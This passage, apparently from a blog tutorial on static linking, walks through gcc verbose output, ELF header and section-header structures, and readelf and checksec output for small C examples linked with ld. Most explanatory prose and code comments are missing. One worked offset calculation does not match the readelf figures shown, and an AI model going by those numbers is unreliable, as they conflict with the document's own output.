class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>) version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (x86_64-linux-gnu)</span><br><span class="line">        compiled by GNU C version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>, GMP version <span class="number">6.1</span><span class="number">.0</span>, MPFR version <span class="number">3.1</span><span class="number">.4</span>, MPC version <span class="number">1.0</span><span class="number">.3</span></span><br><span class="line">GGC heuristics: --param ggc-min-expand=<span class="number">100</span> --param ggc-min-heapsize=<span class="number">131072</span></span><br><span class="line">ignoring nonexistent directory <span class="string">&quot;/usr/local/include/x86_64-linux-gnu&quot;</span></span><br><span class="line">ignoring nonexistent directory <span class="string">&quot;/usr/lib/gcc/x86_64-linux-gnu/5/../../../../x86_64-linux-gnu/include&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;...&quot;</span> search starts here:</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;...&gt;</span> search starts here:</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/include</span><br><span class="line"> /usr/local/include</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/include-fixed</span><br><span class="line"> /usr/include/x86_64-linux-gnu</span><br><span class="line"> /usr/include</span><br><span class="line">End of search <span class="built_in">list</span>.</span><br><span class="line">GNU C11 (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>) version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (x86_64-linux-gnu)</span><br><span class="line">        compiled by GNU C version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>, GMP version <span class="number">6.1</span><span class="number">.0</span>, MPFR version <span class="number">3.1</span><span class="number">.4</span>, MPC version <span class="number">1.0</span><span class="number">.3</span></span><br><span class="line">GGC heuristics: --param ggc-min-expand=<span class="number">100</span> --param ggc-min-heapsize=<span class="number">131072</span></span><br><span class="line">Compiler executable checksum: <span class="number">8087146</span>d2ee737d238113fb57fabb1f2</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> as -v -<span class="number">-64</span> -o /tmp/ccyxTcBb.o /tmp/ccZSA6XB.s</span><br><span class="line">GNU assembler version <span class="number">2.26</span><span class="number">.1</span> (x86_64-linux-gnu) using BFD version (GNU Binutils <span class="keyword">for</span> Ubuntu) <span class="number">2.26</span><span class="number">.1</span></span><br><span class="line">COMPILER_PATH=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/</span><br><span class="line">LIBRARY_PATH=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../../lib/:/lib/x86_64-linux-gnu/:/lib/../lib/:/usr/lib/x86_64-linux-gnu/:/usr/lib/../lib/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../:/lib/:/usr/lib/</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/lto-wrapper -plugin-opt=-fresolution=/tmp/ccvOb2eL.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --sysroot=/ --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> -z relro /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crt1.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/crtbegin.o -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span> -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../.. /tmp/ccyxTcBb.o -lgcc --as-needed -lgcc_s --no-as-needed -lc -lgcc --as-needed -lgcc_s --no-as-needed /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/crtend.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crtn.o</span><br></pre></td></tr></table></figure><p>tmd? !</p><p></p><p>gcc</p><p>cc1(cpp) ps:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/cc1 -quiet -v -imultiarch x86_64-linux-gnu test2.c -quiet -dumpbase test2.c -mtune=generic -march=x86<span class="number">-64</span> -auxbase test2 -version -fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccZSA6XB.s</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ignoring nonexistent directory &quot;/usr/local/include/x86_64-linux-gnu&quot;</span><br><span class="line">ignoring nonexistent directory &quot;/usr/lib/gcc/x86_64-linux-gnu/5/../../../../x86_64-linux-gnu/include&quot;</span><br><span class="line">#include &quot;...&quot; search starts here:</span><br><span class="line">#include &lt;...&gt; search starts here:</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/5/include</span><br><span class="line"> /usr/local/include</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/5/include-fixed</span><br><span class="line"> /usr/include/x86_64-linux-gnu</span><br><span class="line"> /usr/include</span><br><span class="line">End of search list.</span><br></pre></td></tr></table></figure><p>as </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">as -v --64 -o /tmp/ccyxTcBb.o /tmp/ccZSA6XB.s</span><br></pre></td></tr></table></figure><p><code> /usr/lib/gcc/x86_64-linux-gnu/5/collect2</code><code>/x86_64-linux-gnu/crtn.o</code>collect2 collect2ld</p><p>ld</p><h2 id="linker"><a href="#linker" class="headerlink" title="linker"></a>linker</h2><p>linker,linker</p><p>linker: ??!</p><h3 id="Relocatable-object-file"><a href="#Relocatable-object-file" class="headerlink" title="Relocatable object file"></a>Relocatable object file</h3><p>ELF</p><pre><code>The following types are used for  N-bit  architectures  (N=32,64,  ElfNstands for Elf32 or Elf64, uintN_t stands for uint32_t or uint64_t):ElfN_Addr       Unsigned program address, uintN_tElfN_Off        Unsigned file offset, uintN_tElfN_Section    Unsigned section index, uint16_tElfN_Versym     Unsigned version symbol information, uint16_tElf_Byte        unsigned charElfN_Half       uint16_tElfN_Sword      int32_tElfN_Word       uint32_tElfN_Sxword     int64_tElfN_Xword      uint64_t</code></pre><p> simple_section.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> global_static_var;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> reference_to_out;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">85</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var2;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line">    func1(static_var + static_var2 + a + b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc -m32 -c simple_section.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; file simple_section.o</span><br><span class="line">simple_section.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br></pre></td></tr></table></figure><p>ELFsection head table linker?</p><p>ELF header</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT   16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT]; <span class="comment">/* ELF */</span></span><br><span class="line">    Elf32_Half      e_type;             <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_machine;          <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Word      e_version;          <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Addr      e_entry;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Off       e_phoff;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Off       e_shoff;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Word      e_flags;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_ehsize;           <span class="comment">/* ELF */</span></span><br><span class="line">    Elf32_Half      e_phentsize;        <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_phnum;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_shentsize;        <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_shnum;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_shstrndx;         <span class="comment">/*  */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p><code>e_shoff</code>(section header table offset)e_shnume_shentsize</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; readelf -h simple_section.o</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          868 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         13</span><br><span class="line">  Section header string table index: 10</span><br></pre></td></tr></table></figure><p>section</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">There are 13 section headers, starting at offset 0x364:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .text             PROGBITS        00000000 000034 000062 00  AX  0   0  1</span><br><span class="line">  [ 2] .rel.text         REL             00000000 0002cc 000028 08   I 11   1  4</span><br><span class="line">  [ 3] .data             PROGBITS        00000000 000098 000008 00  WA  0   0  4</span><br><span class="line">  [ 4] .bss              NOBITS          00000000 0000a0 000008 00  WA  0   0  4</span><br><span class="line">  [ 5] .rodata           PROGBITS        00000000 0000a0 000004 00   A  0   0  1</span><br><span class="line">  [ 6] .comment          PROGBITS        00000000 0000a4 000036 01  MS  0   0  1</span><br><span class="line">  [ 7] .note.GNU-stack   PROGBITS        00000000 0000da 000000 00      0   0  1</span><br><span class="line">  [ 8] .eh_frame         PROGBITS        00000000 0000dc 000064 00   A  0   0  4</span><br><span class="line">  [ 9] .rel.eh_frame     REL             00000000 0002f4 000010 08   I 11   8  4</span><br><span class="line">  [10] .shstrtab         STRTAB          00000000 000304 00005f 00      0   0  1</span><br><span class="line">  [11] .symtab           SYMTAB          00000000 000140 000110 10     12  12  4</span><br><span class="line">  [12] .strtab           STRTAB          00000000 000250 000079 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>section head tableElf32_Shdr Elf32_Shdrsection</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word  sh_name;        <span class="comment">//  .shstrtab </span></span><br><span class="line">    Elf32_Word  sh_type;        <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_flags;       <span class="comment">// </span></span><br><span class="line">    Elf32_Addr  sh_addr;        <span class="comment">// </span></span><br><span class="line">    Elf32_Off   sh_offset;      <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_size;        <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_link;        <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_info;        <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_addralign;   <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_entsize;     <span class="comment">// </span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><strong>sh_name</strong></p><p> .shstrtab  .shstrtab</p><p> .shstrtabnamelinkerelf header.shstrtabsection head tablesection e_shoff+e_shstrndx*e_shentsize&#x3D;904+10*40&#x3D;1304&#x3D;0x508,section</p><p><img src="/2023/04/28/static-link/image-20230428232104339.png" alt="image-20230428232104339"></p><p>sh_name.shstrtab sh_offset0x0328shstrtab sh_name0x0328+0x11&#x3D;0x339</p><p><img src="/2023/04/28/static-link/image-20230428232706551.png" alt="image-20230428232706551"></p><p></p><p>ELF</p><p><strong>sh_type</strong></p><p> SHT_SYMTABSHT_RELASHT_DYNAMICSHT_REL</p><p><strong>sh_flags</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SHF_WRITE     This section  contains  data  that  should  be writable during process execution.</span><br><span class="line"></span><br><span class="line">SHF_ALLOC      This  section  occupies  memory during process execution. Some  control  sections  <span class="keyword">do</span> notreside  in the memory image of an object file. This attribute is off <span class="keyword">for</span> those sections..bss</span><br><span class="line"></span><br><span class="line">SHF_EXECINSTR  This  section  contains   executable   machineinstructions.</span><br><span class="line"></span><br><span class="line">SHF_MASKPROC   All  bits  included  in this mask are reserved <span class="keyword">for</span> processor-specific semantics.</span><br></pre></td></tr></table></figure><p><strong>sh_link</strong><strong>sh_info</strong></p><p><img src="/2023/04/28/static-link/image-20230429003128446.png" alt="image-20230429003128446"></p><p><strong>sh_entsize</strong></p><p> </p><h3 id="static-link"><a href="#static-link" class="headerlink" title="static link"></a>static link</h3><p><strong>a.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>b.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> shared = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span> &#123;</span><br><span class="line">    *a ^= *b ^= *a ^= *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32 -fno-<span class="built_in">stack</span>-protector -c a.c b.c</span><br><span class="line">a.c: In function main:</span><br><span class="line">a.c:<span class="number">6</span>:<span class="number">5</span>: warning: implicit declaration of function swap [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; ld -m elf_i386 a.o b.o -e main -o  ab</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; file a.o b.o ab</span><br><span class="line">a.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br><span class="line">b.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br><span class="line">ab:  ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure><p>canary__stack_chk_failld</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32  -c a.c b.c</span><br><span class="line">a.c: In function main:</span><br><span class="line">a.c:6:5: warning: implicit declaration of function swap [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; checksec a.o</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/link-load-library-code/chapter4/a.o&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32 -fno-stack-protector -c a.c b.c</span><br><span class="line">a.c: In function main:</span><br><span class="line">a.c:6:5: warning: implicit declaration of function swap [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; checksec a.o</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/link-load-library-code/chapter4/a.o&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>ld-emianld_start</p><p>gcc11.3-fno-piepie,gcc5</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S a.o</span><br><span class="line">There are <span class="number">12</span> section headers, starting at offset <span class="number">0x220</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000039</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .rel.text         REL             <span class="number">00000000</span> <span class="number">0001b</span>0 <span class="number">000010</span> <span class="number">08</span>   I <span class="number">10</span>   <span class="number">1</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">4</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000036</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>a3 <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .eh_frame         PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>a4 <span class="number">000044</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">8</span>] .rel.eh_frame     REL             <span class="number">00000000</span> <span class="number">0001</span>c0 <span class="number">000008</span> <span class="number">08</span>   I <span class="number">10</span>   <span class="number">7</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">9</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0001</span>c8 <span class="number">000057</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [<span class="number">10</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0000e8</span> <span class="number">0000b</span>0 <span class="number">10</span>     <span class="number">11</span>   <span class="number">8</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">11</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000198</span> <span class="number">000016</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S b.o</span><br><span class="line">There are <span class="number">11</span> section headers, starting at offset <span class="number">0x1f4</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000039</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">000070</span> <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">000074</span> <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">4</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">000074</span> <span class="number">000036</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>aa <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .eh_frame         PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>ac <span class="number">000038</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">7</span>] .rel.eh_frame     REL             <span class="number">00000000</span> <span class="number">000198</span> <span class="number">000008</span> <span class="number">08</span>   I  <span class="number">9</span>   <span class="number">6</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">8</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0001</span>a0 <span class="number">000053</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">9</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0000e4</span> <span class="number">0000</span>a0 <span class="number">10</span>     <span class="number">10</span>   <span class="number">8</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">10</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000184</span> <span class="number">000011</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S ab</span><br><span class="line">There are <span class="number">8</span> section headers, starting at offset <span class="number">0x2e4</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">08048094</span> <span class="number">000094</span> <span class="number">000072</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .eh_frame         PROGBITS        <span class="number">08048108</span> <span class="number">000108</span> <span class="number">000064</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS        <span class="number">0804916</span>c <span class="number">00016</span>c <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">000170</span> <span class="number">000035</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0002</span>aa <span class="number">00003</span>a <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0001</span>a8 <span class="number">0000</span>d0 <span class="number">10</span>      <span class="number">7</span>   <span class="number">7</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">7</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000278</span> <span class="number">000032</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>linkerelf header</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>.symtab section</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word    st_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    Elf32_Addr    st_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf32_Word    st_size;<span class="comment">/* 